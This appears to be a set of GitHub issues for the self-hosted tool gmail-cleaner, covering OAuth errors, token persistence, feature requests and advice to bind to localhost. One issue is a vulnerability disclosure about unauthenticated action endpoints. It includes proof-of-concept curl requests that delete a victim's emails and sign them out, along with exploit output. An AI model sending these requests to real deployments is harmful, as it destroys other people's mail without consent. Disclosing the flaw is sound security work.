title: Better to bind to 127.0.0.1
author: xpe
body:
Instead of:

```
uv run python main.py
```

I suggest running:

```
 uv run uvicorn app.main:app --host 127.0.0.1 --port 8766
```

It is safer to bind to localhost than `0.0.0.0`, which is available to any network peer.

See also: https://github.com/Gururagavendra/gmail-cleaner/pull/110

title: [Bug]: Missing Authentication on All Action Endpoints in gmail-cleaner
author: AAtomical
body: ### Environment Docker ### Bug Description ## Summary gmail-cleaner exposes all destructive action endpoints (`/api/delete-emails`, `/api/delete-emails-bulk`, `/api/unsubscribe`, `/api/mark-read`, `/api/archive`, `/api/sign-out`) with **zero authentication**. No middleware, no `Depends()`, no session/token check exists anywhere in the application. After a user has OAuth'd their Gmail account, any network-adjacent attacker can call these endpoints to delete, archive, or unsubscribe from the victim's emails using the stored Gmail credentials. The Docker deployment binds `0.0.0.0:8766`, exposing the unauthenticated API to the entire local network. ## Affected Component - **Repository**: - **File**: `app/api/actions.py` (all routes) - **Application factory**: `app/main.py` — no auth middleware registered - **Version**: 1.0.0 (latest) ## Vulnerability Details ### No authentication anywhere ```python # app/api/actions.py — every route is bare router = APIRouter(prefix="/api", tags=["Actions"]) @router.post("/delete-emails") async def api_delete_emails(request: DeleteEmailsRequest): return delete_emails_by_sender(request.sender) @router.post("/delete-emails-bulk") async def api_delete_emails_bulk(request: DeleteBulkRequest, background_tasks: BackgroundTasks): background_tasks.add_task(delete_emails_bulk_background, request.senders) return {"status": "started"} ``` ### No middleware in app factory ```python # app/main.py def create_app() -> FastAPI: app = FastAPI(...) app.include_router(actions_router) # ← no auth wrapping return app ``` ### Docker binds all interfaces ```python # main.py uvicorn.run(app, host="0.0.0.0", port=port) ``` ## Proof of Concept ### Environment | Component | Detail | |-----------|--------| | gmail-cleaner | 1.0.0 (Docker, official Dockerfile) | | Image | Built from source, `docker run -p 18766:8766` | | Attack | curl from host to container (simulates LAN attacker) | ### Exploit ```bash docker build -t gmail-cleaner . docker run -d -p 8766:8766 -v credentials.json:/app/credentials.json gmail-cleaner # Attacker (any machine on same network): curl -X POST http://victim:8766/api/delete-emails \ -H "Content-Type: application/json" \ -d '{"sender":"important@work.com"}' curl -X POST http://victim:8766/api/delete-emails-bulk \ -H "Content-Type: application/json" \ -d '{"senders":["ceo@company.com","hr@company.com"]}' curl -X POST http://victim:8766/api/sign-out -H "Content-Type: application/json" -d '{}' ``` ## Suggested Fix ```python from fastapi import Depends, HTTPException, Request async def require_auth(request: Request): session = request.cookies.get("session_id") if not session or not validate_session(session): raise HTTPException(status_code=401) router = APIRouter(prefix="/api", dependencies=[Depends(require_auth)]) ``` ### Steps to Reproduce ### Exploit ```bash docker build -t gmail-cleaner . docker run -d -p 8766:8766 -v credentials.json:/app/credentials.json gmail-cleaner # Attacker (any machine on same network): curl -X POST http://victim:8766/api/delete-emails \ -H "Content-Type: application/json" \ -d '{"sender":"important@work.com"}' curl -X POST http://victim:8766/api/delete-emails-bulk \ -H "Content-Type: application/json" \ -d '{"senders":["ceo@company.com","hr@company.com"]}' curl -X POST http://victim:8766/api/sign-out -H "Content-Type: application/json" -d '{}' ``` ### Error Logs ```shell === gmail-cleaner Docker Exploit (zero auth) === Target: http://localhost:18766 (Docker container) [+] POST /api/delete-emails → 200 [+] POST /api/delete-emails-bulk → 200 [+] POST /api/unsubscribe → 200 [+] POST /api/mark-read → 200 [+] POST /api/scan → 200 [+] POST /api/archive → 200 [+] POST /api/sign-out → 200 All 200 = NO AUTHENTICATION ENFORCED ``` ### Screenshots ### Checklist - [x] I have searched existing issues to ensure this bug hasn't been reported - [x] I am using my own Google Cloud credentials (not someone else's)

body:

Is it possible (if not can we add?) to only show the sender results from mails only in the inbox? I'd like an option in the filter to only show inbox items please.
Thank you.

title: [Bug]: Error 400: redirect_uri_mismatch when running Docker image
author: DrStrangepork
body:
### Environment

Docker

### Bug Description

"URL to authorize this application" always results in "Error 400: redirect_uri_mismatch"

### Steps to Reproduce

I launch the local app at `http://localhost:8766/`, I get "Sign in with Google". Click that, and the "URL to authorize this application" pops up in my running container log. I open that in a browser, and I always get:

**Access blocked: This app’s request is invalid**
You can’t sign in because this app sent an invalid request. You can try again later, or contact the developer about this issue. [Learn more about this error](https://developers.google.com/identity/protocols/oauth2/web-server#authorization-errors-redirect-uri-mismatch)
If you are a developer of this app, see error details.
Error 400: redirect_uri_mismatch

I tried adding `http://localhost:8767/` as an "Authorized redirect URIs", and that doesn't work either. Tried Private Browsing, Chrome, Brave, always the same message. I have confirmed that the authorize URL contains the correct id and secret from credentials.json. Existing issues related to redirect_uri_mismatch are using a hosted domain; I am running this locally from my Macbook.

### Error Logs

```shell
None
```

### Screenshots

_No response_

### Checklist

- [x] I have searched existing issues to ensure this bug hasn't been reported
- [x] I am using my own Google Cloud credentials (not someone else's)

title: [Feature]: Add Labels to all threads in a conversation
author: PureLoneWolf
body:
### Feature Idea

Hi

I don't know how possible this would be but a big issue for me is that, unless you remember to set the label each time a reply comes through, conversations only have the label set on the messages that existed when you set the label in the first place, even though they are all "under" the label when you click.

I would love a way to add labels that exist in any message to all messages in the conversation.

The main reason for this is that my Wife...for years...was swiping things away, thinking they were being deleted...only to discover she's burned through her storage as she was archiving.  When I tried to filter All Mail on "has:nouserlabels" and excluding the inbox etc...still returns tons of messages that are part of conversations where she has set a label.

Not sure if that's even remotely clear, hopefully it is :)



### Priority

Important

### Contribution

- [ ] I would be willing to help implement this feature

title: [Bug]: Error during authentication
author: ilbarone87
body:
### Environment

Docker

### Bug Description

The authentication get stuck when i get to the point I need to give permission to the app to read my email.
My configuration include: 

- docker container
- custom domain (set up an A record in my DNS for gmail-cleaner.mydomain.net to resolve to my container host 10.10.10.34)
- redirect_uri is pointing at http://gmail-cleaner.mydomain.net:8767/

I have also tried to use traefik reverse-proxy but getting equally stuck at the same step. When set up with traefik this is the dynamic config for traefik I have used:

```
http:
  routers:
    app-router:
      rule: "Host(`gmail-cleaner.mydomain.net`)"
      entryPoints:
        - websecure
      service: app-service

  services:
    app-service:
      loadBalancer:
        servers:
          - url: "http://10.10.10.34:8767"
```
In this case the record was a CNAME for gmail-cleaner.mydomain.net pointing at my TLD domain. When set up this way no error was logged in the container, but still getting stuck.

Not really sure if this a bug or some kind of misconfiguration.
gmail-cleaner.mydomain.net is not exposed publicly. 

### Steps to Reproduce

1. spin up a container in docker
2. set up the gcp part
3. redirect_uri set to “http://gmail-cleaner.mydomain.net:8767/“
4. open the ui in the browser for gmail-cleaner and click on sign in
5. get the oauth link from container logs and paste in the browser
6. follow the step until it requests to tick the boxes for permissions, after click on continue
7. process remain stuck loading forever

### Error Logs

```shell
OAuth error: 'NoneType' object has no attribute 'replace'
Traceback (most recent call last):
  File "/app/app/services/auth.py", line 503, in run_oauth
    new_creds = flow.run_local_server(
OAuth error: 'NoneType' object has no attribute 'replace'
                ^^^^^^^^^^^^^^^^^^^^^^
  File "/app/.venv/lib/python3.11/site-packages/google_auth_oauthlib/flow.py", line 457, in run_local_server
    authorization_response = wsgi_app.last_request_uri.replace("http", "https")
                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'replace'
```

### Screenshots

_No response_

### Checklist

- [x] I have searched existing issues to ensure this bug hasn't been reported
- [x] I am using my own Google Cloud credentials (not someone else's)

title: [Bug]: token.json not written
author: Basti-Fantasti
body:
### Environment

Docker

### Bug Description

I've wanted to use the token.json setting so that I not need to login everytime I start the container,
but the token.json file is never written. 

I see that the token.json is created inside the container but never transferred outside
when doing as suggested to run the container once without the token.json setting enabled and enabling it on the second start it doesn't work.
I'd suggest to mount a `data` folder into the container to save the token.json persistent
then the user can mount the token.json file e.g. from the `/data/token.json` location

I've now made a workaround to manually copy the token.json file from the container to the root directory - this worked and the token is loaded successfully.

or you could add a `auth` folder and put the credentials.json file in there and the generated token.json from within the container. 
Then both files would be persistent



### Steps to Reproduce

Try the token.json generation as suggested

### Error Logs

```shell

```

### Screenshots

_No response_

### Checklist

- [x] I have searched existing issues to ensure this bug hasn't been reported
- [x] I am using my own Google Cloud credentials (not someone else's)
